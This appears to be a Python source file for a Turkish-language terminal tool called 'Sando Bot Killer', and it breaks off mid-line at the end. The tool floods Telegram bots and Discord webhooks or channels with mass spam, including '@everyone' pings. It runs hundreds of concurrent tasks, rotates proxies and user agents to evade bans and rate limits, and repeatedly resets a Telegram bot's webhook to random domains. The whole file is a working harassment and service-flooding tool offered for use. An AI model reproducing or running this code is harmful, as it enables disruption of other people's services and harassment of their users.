#!/usr/bin/env python3

import os
import sys
import time
import json
import uuid
import random
import asyncio
import aiohttp
import itertools
from datetime import datetime

# aiohttp_socks isteğe bağlı – proxy kullanacaksan yükle
try:
    from aiohttp_socks import ProxyConnector
    SOCKS_VAR = True
except ImportError:
    SOCKS_VAR = False
    ProxyConnector = None

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_VAR = True
except ImportError:
    COLORAMA_VAR = False
    class Fore:
        GREEN = '\033[92m'; RED = '\033[31m'; WHITE = '\033[37m'
        CYAN = '\033[96m'; YELLOW = '\033[93m'; MAGENTA = '\033[95m'
        BLUE = '\033[94m'; BLACK = '\033[30m'
    class Back:
        MAGENTA = '\033[45m'; BLACK = '\033[40m'; WHITE = '\033[47m'
        GREEN = '\033[42m'; RED = '\033[41m'
    class Style:
        BRIGHT = '\033[1m'; DIM = '\033[2m'; NORMAL = '\033[22m'

class AnimasyonluArayuz:
    def __init__(self):
        self.animasyon_aktif = True
        
    def yukleniyor_animasyonu(self, mesaj="İşlem yapılıyor", sure=3):
        spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        baslangic = time.time()
        while time.time() - baslangic < sure:
            sys.stdout.write(f'\r{Fore.CYAN}{next(spinner)} {mesaj}... {Style.DIM}')
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write(f'\r{Fore.GREEN}✓ {mesaj} tamamlandı!    \n')
        sys.stdout.flush()
    
    def banner_goster(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        banner = r"""
____   ____________ __________  _______  _______________  ___        _____.___.___________________   ________  .____     
\   \ /   /\_____  \\______   \ \      \ \_   _____/\   \/  /        \__  |   |\__    ___/\_____  \  \_____  \ |    |    
 \   Y   /  /   |   \|       _/ /   |   \ |    __)_  \     /   ______ /   |   |  |    |    /   |   \  /   |   \|    |    
  \     /  /    |    \    |   \/    |    \|        \ /     \  /_____/ \____   |  |    |   /    |    \/    |    \    |___ 
   \___/   \_______  /____|_  /\____|__  /_______  //___/\  \         / ______|  |____|   \_______  /\_______  /_______ \
                   \/       \/         \/        \/       \_/         \/                          \/         \/        \/
"""
        print(f"{Fore.CYAN}{Style.BRIGHT}{banner}")
        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Geliştirici: {Fore.CYAN}Vornexx ")
        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.GREEN}Github : VornexxBaba {Fore.CYAN} Instagram : mr.vornexx")
        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Tarih: {Fore.CYAN}{datetime.now().strftime('%d.%m.%Y %H:%M')}")
        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Platform: {Fore.GREEN}Linux / Win / Mac (Termux uyumlu)")
        print(f"{Fore.RED}{Style.BRIGHT}{'─'*55}\n")

    def durum_goster(self, baslik, durum, detay=""):
        simgeler = {
            'basari': f"{Fore.GREEN}✅", 'hata': f"{Fore.RED}❌",
            'bilgi': f"{Fore.CYAN}ℹ️", 'uyari': f"{Fore.YELLOW}⚠️",
            'calisiyor': f"{Fore.BLUE}🔄"
        }
        simge = simgeler.get(durum, "•")
        renk = {'basari': Fore.GREEN, 'hata': Fore.RED, 'uyari': Fore.YELLOW,
                'bilgi': Fore.CYAN, 'calisiyor': Fore.BLUE}.get(durum, Fore.WHITE)
        print(f"{simge} {Fore.WHITE}{baslik}: {renk}{detay}")
    
    def menu_goster(self):
        menu = f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗
║                                                      ║
║  {Fore.YELLOW}[1] {Fore.WHITE}Ayarlar (Proxy / Thread / Anti-Ban / Süre)    ║
║  {Fore.YELLOW}[2] {Fore.WHITE}Sando Bot Killer (Telegram / Discord)          ║
║  {Fore.YELLOW}[3] {Fore.WHITE}Çıkış                                         ║
║                                                      ║
{Fore.CYAN}╚══════════════════════════════════════════════════╝
        """
        print(menu)

# ==================== SANDO BOT KILLER (ANTI-BAN) ====================
class SandoKiller:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0",
    ]

    def __init__(self, ui, target_type, token=None, webhook=None,
                 threads=200, proxy_list=None, duration=0, anti_ban=True):
        self.ui = ui
        self.target_type = target_type.lower()
        self.token = token
        self.webhook = webhook
        self.threads = threads
        self.proxies = proxy_list if proxy_list else []
        self.duration = duration
        self.anti_ban = anti_ban
        self.running = True
        self.istatistik = {'gonderilen': 0, 'hata': 0, 'ban_risk': 0}
        self._proxy_cycle = itertools.cycle(self.proxies) if self.proxies else None

    def _get_connector(self):
        if self.proxies and SOCKS_VAR:
            proxy = next(self._proxy_cycle)
            return ProxyConnector.from_url(proxy)
        return None

    def _random_headers(self):
        return {
            "User-Agent": random.choice(self.USER_AGENTS),
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8",
            "Cache-Control": "no-cache"
        }

    async def _telegram_spam(self, session):
        base = f"https://api.telegram.org/bot{self.token}/"
        chat_id = random.randint(100000, 999999999)
        while self.running:
            try:
                payload = {
                    "chat_id": chat_id,
                    "text": "SANDO PATLATIYOR " * random.randint(50, 200) + str(random.randint(1,9999))
                }
                async with session.post(base + "sendMessage", json=payload, timeout=0.5) as resp:
                    if resp.status in (429, 403):
                        self.istatistik['ban_risk'] += 1
                        if self.anti_ban:
                            await asyncio.sleep(random.uniform(2, 5))
                    else:
                        self.istatistik['gonderilen'] += 1
            except:
                self.istatistik['hata'] += 1
            await asyncio.sleep(random.uniform(0.001, 0.005))

    async def _telegram_webhook_flood(self, session):
        base = f"https://api.telegram.org/bot{self.token}/" if self.token else ""
        while self.running:
            try:
                async with session.post(base + "setWebhook",
                                        json={"url": f"https://{uuid.uuid4().hex[:10]}.com/loop"}) as resp:
                    if resp.status in (429, 403):
                        self.istatistik['ban_risk'] += 1
                        if self.anti_ban:
                            await asyncio.sleep(3)
                    else:
                        self.istatistik['gonderilen'] += 1
            except:
                self.istatistik['hata'] += 1
            await asyncio.sleep(random.uniform(0.01, 0.03))

    async def _discord_webhook_spam(self, session):
        while self.running:
            try:
                data = {
                    "content": "@everyone SANDO ÇÖKERTİYOR " * random.randint(80, 150),
                    "username": f"AlphaBot_{random.randint(1,999)}"
                }
                async with session.post(self.webhook, json=data, timeout=0.5) as resp:
                    if resp.status in (429, 403):
                        self.istatistik['ban_risk'] += 1
                        if self.anti_ban:
                            await asyncio.sleep(2)
                    else:
                        self.istatistik['gonderilen'] += 1
            except:
                self.istatistik['hata'] += 1
            await asyncio.sleep(random.uniform(0.001, 0.004))

    async def _discord_token_spam(self, session):
        headers = self._random_headers()
        headers["Authorization"] = f"Bot {self.token}"
        try:
            async with session.get("https://discord.com/api/v9/users/@me/guilds",
                                   headers=headers) as resp:
                if resp.status != 200:
                    self.ui.durum_goster("Discord Token", "hata", "Geçersiz token veya yetki yok")
                    return
                guilds = await resp.json()
                for g in guilds[:2]:
                    async with session.get(f"https://discord.com/api/v9/guilds/{g['id']}/channels",
                                           headers=headers) as ch:
                        channels = await ch.json()
                        for c in channels[:2]:
                            while self.running:
                                try:
                                    async with session.post(
                                        f"https://discord.com/api/v9/channels/{c['id']}/messages",
                                        headers=headers,
                                        json={"content": "SANDO ÇÖKERTİYOR " * 200}
                                    ) as resp2:
                                        if resp2.status in (429, 403):
                                            self.istatistik['ban_risk'] += 1
                                            if self.anti_ban:
                                                await asyncio.sleep(3)
                                        else:
                                            self.istatistik['gonderilen'] += 1
                                except:
                                    self.istatistik['hata'] += 1
                                await asyncio.sleep(random.uniform(0.001, 0.003))
        except:
            self.ui.durum_goster("Discord Token", "hata", "İstek başarısız, token kontrol et")

    async def _worker(self):
        connector = self._get_connector()
        headers = self._random_headers()
        async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
            tasks = []
            if self.target_type == "telegram":
                if self.token and not self.webhook:
                    tasks = [self._telegram_spam(session) for _ in range(self.threads)]
                else:
                    tasks = [self._telegram_webhook_flood(session) for _ in range(self.threads)]
            elif self.target_type == "discord":
                if self.webhook:
                    tasks = [self._discord_webhook_spam(session) for _ in range(self.threads)]
                elif self.token:
                    tasks = [self._discord_token_spam(session) for _ in range(self.threads)]
            else:  # both
                tasks = []
                if self.token:
                    tasks.extend([self._telegram_spam(session) for _ in range(self.threads//2)])
                if self.webhook:
                    tasks.extend([self._discord_webhook_spam(session) for _ in range(self.threads//2)])
                if not tasks:
                    tasks = [asyncio.sleep(0.1) for _ in range(self.threads)]
            await asyncio.gather(*tasks, return_exceptions=True)

    async def start(self):
        self.ui.durum_goster("Sando Killer", "bilgi", 
            f"Hedef: {self.target_type.upper()} | Thread: {self.threads} | Anti-Ban: {self.anti_ban} | Proxy: {'Var' if self.proxies else 'Yok'}")
        if self.duration > 0:
            asyncio.create_task(self._timer())
        await self._worker()

    async def _timer(self):
        await asyncio.sleep(self.duration)
        self.running = False
        self.ui.durum_goster("Süre", "uyari", "Doldu, durduruluyor.")

# ==================== ANA MOTOR ====================
class AramaMotoru:
    def __init__(self):
        self.ui = AnimasyonluArayuz()
        self.aktif = True
        self.ayarlar = {
            'debug_modu': False,
            'anti_ban': True,               # Madde 3
            'default_threads': 200,         # Madde 2 (50-300 arası)
            'default_duration': 0,          # Madde 4 (0 = sonsuz)
            'proxy_dosyasi': ''             # Madde 1 (örn: proxy.txt)
        }
    
    def baslat(self):
        try:
            self.ui.banner_goster()
            self._bagimlilik_kontrol()
            while self.aktif:
                self.ui.menu_goster()
                secim = input(f"{Fore.YELLOW}Seçiminiz (1-3): {Fore.WHITE}")
                if secim == "1":
                    self._ayarlar_menu()
                elif secim == "2":
                    self._bot_killer_menu()
                elif secim == "3":
                    self._cikis()
                else:
                    print(f"{Fore.RED}Geçersiz seçim!")
                    time.sleep(1)
        except KeyboardInterrupt:
            self._cikis()
        except Exception as e:
            print(f"{Fore.RED}Beklenmeyen hata: {e}")
            if self.ayarlar['debug_modu']:
                import traceback; traceback.print_exc()
            time.sleep(3)
    
    def _bagimlilik_kontrol(self):
        required = ['aiohttp', 'colorama']
        missing = []
        for lib in required:
            try:
                __import__(lib)
            except ImportError:
                missing.append(lib)
        if missing:
            self.ui.durum_goster("Kütüphane", "uyari", f"Eksik: {', '.join(missing)}")
            print(f"{Fore.YELLOW}Yüklemek için: pip install {' '.join(missing)}")
            time.sleep(2)
            if 'aiohttp_socks' not in sys.modules and self.ayarlar['proxy_dosyasi']:
                print(f"{Fore.YELLOW}Proxy için aiohttp-socks önerilir: pip install aiohttp-socks")

    # ================= AYARLAR MENÜSÜ =================
    def _ayarlar_menu(self):
        while True:
            self.ui.banner_goster()
            print(f"{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗")
            print(f"║  {Fore.YELLOW}📌 MEVCUT AYARLAR                                  ║")
            print(f"║                                                      ║")
            print(f"║  {Fore.WHITE}[1] Anti-Ban Modu       : {Fore.GREEN}{self.ayarlar['anti_ban']}")
            print(f"║  {Fore.WHITE}[2] Varsayılan Thread   : {Fore.GREEN}{self.ayarlar['default_threads']} (Öneri: 50-300)")
            print(f"║  {Fore.WHITE}[3] Varsayılan Süre(sn) : {Fore.GREEN}{self.ayarlar['default_duration']} (0=sonsuz)")
            print(f"║  {Fore.WHITE}[4] Proxy Dosyası       : {Fore.GREEN}{self.ayarlar['proxy_dosyasi'] or 'Kullanılmıyor'}")
            print(f"║                                                      ║")
            print(f"║  {Fore.YELLOW}[5] Ana Menüye Dön                                    ║")
            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝")
            
            secim = input(f"{Fore.YELLOW}Seçiminiz (1-5): {Fore.WHITE}").strip()
            if secim == "1":
                self.ayarlar['anti_ban'] = not self.ayarlar['anti_ban']
                self.ui.durum_goster("Anti-Ban", "bilgi", f"{'Açık' if self.ayarlar['anti_ban'] else 'Kapalı'}")
            elif secim == "2":
                try:
                    val = int(input(f"{Fore.WHITE}Yeni thread sayısı (50-300 önerilir): {Fore.YELLOW}").strip() or "200")
                    if 10 <= val <= 1000:
                        self.ayarlar['default_threads'] = val
                    else:
                        print(f"{Fore.RED}10-1000 arası girin!")
                except: pass
            elif secim == "3":
                try:
                    val = int(input(f"{Fore.WHITE}Yeni süre (saniye, 0=sonsuz): {Fore.YELLOW}").strip() or "0")
                    self.ayarlar['default_duration'] = max(0, val)
                except: pass
            elif secim == "4":
                dosya = input(f"{Fore.WHITE}Proxy dosyası yolu (örn: proxy.txt, boş bırakırsan kullanılmaz): {Fore.YELLOW}").strip()
                if dosya and os.path.exists(dosya):
                    self.ayarlar['proxy_dosyasi'] = dosya
                    self.ui.durum_goster("Proxy", "basari", f"{dosya} yüklendi")
                elif dosya:
                    print(f"{Fore.RED}Dosya bulunamadı! Proxy kullanılmayacak.")
                    self.ayarlar['proxy_dosyasi'] = ''
                else:
                    self.ayarlar['proxy_dosyasi'] = ''
                    self.ui.durum_goster("Proxy", "bilgi", "Kullanılmıyor")
            elif secim == "5":
                break
            time.sleep(0.5)

    # ================= BOT KILLER MENÜSÜ =================
    def _bot_killer_menu(self):
        self.ui.banner_goster()
        print(f"{Fore.RED}{Style.BRIGHT}⚡ SANDO BOT KILLER (Alpha'nın emriyle)")
        print(f"{Fore.CYAN}{'─'*55}")
        
        # Mevcut ayarları göster
        print(f"{Fore.WHITE}Mevcut Ayarlar:")
        print(f"  Thread : {Fore.YELLOW}{self.ayarlar['default_threads']}")
        print(f"  Süre   : {Fore.YELLOW}{self.ayarlar['default_duration']} sn (0=sonsuz)")
        print(f"  Anti-Ban: {Fore.YELLOW}{'Açık' if self.ayarlar['anti_ban'] else 'Kapalı'}")
        print(f"  Proxy  : {Fore.YELLOW}{self.ayarlar['proxy_dosyasi'] or 'Yok'}")
        print()
        
        kullan = input(f"{Fore.WHITE}Bu ayarlarla devam et? (e/h, varsayılan e): {Fore.YELLOW}").strip().lower()
        
        threads = self.ayarlar['default_threads']
        duration = self.ayarlar['default_duration']
        anti_ban = self.ayarlar['anti_ban']
        proxy_list = []
        
        if kullan == 'h':
            try:
                threads = int(input(f"{Fore.WHITE}Thread sayısı (50-300): {Fore.YELLOW}").strip() or str(threads))
                duration = int(input(f"{Fore.WHITE}Süre (sn, 0=sonsuz): {Fore.YELLOW}").strip() or str(duration))
                anti_ban = input(f"{Fore.WHITE}Anti-Ban açık olsun mu? (e/h, varsayılan {anti_ban}): {Fore.YELLOW}").strip().lower() != 'h'
            except: pass
        
        # Proxy yükle
        if self.ayarlar['proxy_dosyasi'] and os.path.exists(self.ayarlar['proxy_dosyasi']):
            with open(self.ayarlar['proxy_dosyasi'], "r") as f:
                proxy_list = [satir.strip() for satir in f if satir.strip()]
            self.ui.durum_goster("Proxy", "bilgi", f"{len(proxy_list)} adet yüklendi")
        
        hedef = input(f"{Fore.WHITE}Hedef platform (telegram / discord / both): {Fore.YELLOW}").strip().lower()
        if hedef not in ["telegram", "discord", "both"]:
            self.ui.durum_goster("Hata", "hata", "Geçersiz platform")
            time.sleep(1); return

        token = None; webhook = None
        if hedef in ["telegram", "both"]:
            token = input(f"{Fore.WHITE}Telegram Bot Token (varsa): {Fore.YELLOW}").strip() or None
        if hedef in ["discord", "both"]:
            webhook = input(f"{Fore.WHITE}Discord Webhook URL (varsa): {Fore.YELLOW}").strip() or None

        if not token and not webhook:
            self.ui.durum_goster("Hata", "hata", "Token veya Webhook girmelisin!")
            time.sleep(1); return

        self.ui.durum_goster("Killer", "calisiyor", "Başlatılıyor...")

        killer = SandoKiller(
            ui=self.ui, target_type=hedef, token=token, webhook=webhook,
            threads=threads, proxy_list=proxy_list, duration=duration, anti_ban=anti_ban
        )

        try:
            asyncio.run(killer.start())
        except KeyboardInterrupt:
            killer.running = False
            self.ui.durum_goster("Killer", "uyari", "Kullanıcı durdurdu.")
        finally:
            self.ui.durum_goster("Killer", "bilgi",
                f"Gönderilen: {killer.istatistik['gonderilen']} | Hata: {killer.istatistik['hata']} | Ban Riski: {killer.istatistik['ban_risk']}")
        input(f"\n{Fore.CYAN}Devam etmek) 
